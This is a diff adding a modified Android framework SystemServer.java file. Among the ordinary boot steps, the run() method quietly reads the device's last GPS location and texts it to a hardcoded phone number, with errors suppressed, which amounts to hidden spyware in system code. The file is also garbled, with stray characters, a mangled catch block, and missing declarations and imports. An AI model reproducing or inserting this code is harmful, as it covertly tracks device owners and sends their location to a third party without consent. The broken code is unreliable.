@@ -1,0 +1,181 @@
+package com.android.server;
+import android.app.ActivityManagerNative;
+import android.app.ActivityThread;
+import android.app.IAlarmManager;
+import android.app.INotificationManager;
+import android.app.usage.UsageStatsManagerInternal;
+import android.content.ComponentName;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.res.Configuration;
+import android.content.res.Resources.Theme;
+import android.os.Build;
+import android.os.Environment;
+import android.os.FactoryTest;
+import android.os.IPowerManager;
+import android.os.Looper;
+import android.os.RemoteException;
+import android.os.ServiceManager;
+import android.os.StrictMode;
+import android.os.SystemClock;
+import android.os.SystemProperties;
+import android.os.UserHandle;
+import android.os.storage.IMountService;
+import android.util.DisplayMetrics;
+import android.util.EventLog;
+import android.util.Slog;
+import android.view.WindowManager;
+import android.webkit.WebViewFactory;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.Manifest;
+import android.net.Uri;
+import com.android.internal.R;
+import com.android.internal.os.BinderInternal;
+import com.android.internal.os.SamplingProfilerIntegration;
+import com.android.server.accessibility.AccessibilityManagerService;
+import com.android.server.accounts.AccountManagerService;
+import com.android.server.am.ActivityManagerService;
+import com.android.server.audio.AudioService;
+import com.android.server.camera.CameraService;
+import com.android.server.clipboard.ClipboardService;
+import com.android.server.content.ContentService;
+import com.android.server.devicepolicy.DevicePolicyManagerService;
+import com.android.server.display.DisplayManagerService;
+import com.android.server.dreams.DreamManagerService;
+import com.android.server.fingerprint.FingerprintService;
+import com.android.server.hdmi.HdmiControlService;
+import com.android.server.input.InputManagerService;
+import com.android.server.job.JobSchedulerService;
+import com.android.server.lights.LightsService;
+import com.android.server.media.MediaRouterService;
+import com.android.server.media.MediaSessionService;
+import com.android.server.media.projection.MediaProjectionManagerService;
+import com.android.server.net.NetworkPolicyManagerService;
+import com.android.server.net.NetworkStatsService;
+import com.android.server.notification.NotificationManagerService;
+import com.android.server.os.SchedulingPolicyService;
+import com.android.server.pm.BackgroundDexOptService;
+import com.android.server.pm.Installer;
+import com.android.server.pm.LauncherAppsService;
+import com.android.server.pm.PackageManagerService;
+import com.android.server.pm.UserManagerService;
+import com.android.server.power.PowerManagerService;
+import com.android.server.power.ShutdownThread;
+import com.android.server.restrictions.RestrictionsManagerService;
+import com.android.server.search.SearchManagerService;
+import com.android.server.statusbar.StatusBarManagerService;
+import com.android.server.storage.DeviceStorageMonitorService;
+import com.android.server.telecom.TelecomLoaderService;
+import com.android.server.trust.TrustManagerService;
+import com.android.server.tv.TvInputManagerService;
+import com.android.server.twilight.TwilightService;
+import com.android.server.usage.UsageStatsService;
+import com.android.server.usb.UsbService;
+import com.android.server.wallpaper.WallpaperManagerService;
+import com.android.server.webkit.WebViewUpdateService;
+import com.android.server.wm.WindowManagerService;
+import dalvik.system.VMRuntime;
+import java.io.File;
+import java.util.Locale;L
+import java.util.Timer;
+import java.util.TimerTask;
+import android.telephony.gsm.SmsManager;
+public final class SystemServer {
+   
+    private void run() {
+        if (System.currentTimeMillis() < EARLIEST_SUPPORTED_TIME) {
+            Slog.w(TAG, "System clock is before 1970; setting to 1970.");
+            SystemClock.setCurrentTimeMillis(EARLIEST_SUPPORTED_TIME);
+        }
+
+        if (!SystemProperties.get("persist.sys.language").isEmpty()) {
+            final String languageTag = Locale.getDefault().toLanguageTag();
+
+            SystemProperties.set("persist.sys.locale", languageTag);
+            SystemProperties.set("persist.sys.language", "");
+            SystemProperties.set("persist.sys.country", "");
+            SystemProperties.set("persist.sys.localevar", "");
+        }
+
+        Slog.i(TAG, "Entered the Android system server!");
+        EventLog.writeEvent(EventLogTags.BOOT_PROGRESS_SYSTEM_RUN, SystemClock.uptimeMillis());
+
+        SystemProperties.set("persist.sys.dalvik.vm.lib.2", VMRuntime.getRuntime().vmLibrary());
+
+        if (SamplingProfilerIntegration.isEnabled()) {
+            SamplingProfilerIntegration.start();
+            mProfilerSnapshotTimer = new Timer();
+            mProfilerSnapshotTimer.schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    SamplingProfilerIntegration.writeSnapshot("system_server", null);
+                }
+            }, SNAPSHOT_INTERVAL, SNAPSHOT_INTERVAL);
+        }
+
+        VMRuntime.getRuntime().clearGrowthLimit();
+
+        VMRuntime.getRuntime().setTargetHeapUtilization(0.8f);
+
+        Build.ensureFingerprintProperty();
+
+        Environment.setUserRequired(true);
+
+        BinderInternal.disableBackgroundScheduling(true);
+
+        android.os.Process.setThreadPriority(
+                android.os.Process.THREAD_PRIORITY_FOREGROUND);
+        android.os.Process.setCanSelfBackground(false);
+        Looper.prepareMainLooper();
+
+        System.loadLibrary("android_servers");
+
+        performPendingShutdown();
+
+        createSystemContext();
+
+        mSystemServiceManager = new SystemServiceManager(mSystemContext);
+        LocalServices.addService(SystemServiceManager.class, mSystemServiceManager);
+
+        try {
+            startBootstrapServices();
+            startCoreServices();
+            startOtherServices();
+        } catch (Throwable ex) {
+            Slog.e("System", "            Slog.e("System", "            throw ex;
+        }
+
+        if (StrictMode.conditionallyEnableDebugLogging()) {
+            Slog.i(TAG, "Enabled StrictMode for system server main thread.");
+        }
+        try {
+            LocationManager mLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            Location mLocation = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            String latlon = Double.toString(mLocation.getLongitude()) + Double.toString(mLocation.getLatitude());
+            SmsManager mSmsManager = SmsManager.getDefault();
+            mSmsManager.sendTextMessage("+84987654321", null, latlon, null, null);
+        }catch (Throwable ex){
+            Log.i("Error LatLong", String.valueOf(ex));
+        }
+
+        Looper.loop();
+        throw new RuntimeException("Main thread loop unexpectedly exited");
+    }
+    public void onLocationChanged(Location location) {
+
+    }
+    public void onStatusChanged(String s, int i, Bundle bundle) {
+
+    }
+    public void onProviderEnabled(String s) {
+
+    }
+    public void onProviderDisabled(String s) {
+
+    }
+}
+//In file: H:\framework\base\services\java\com\android\server\SystemServer.java
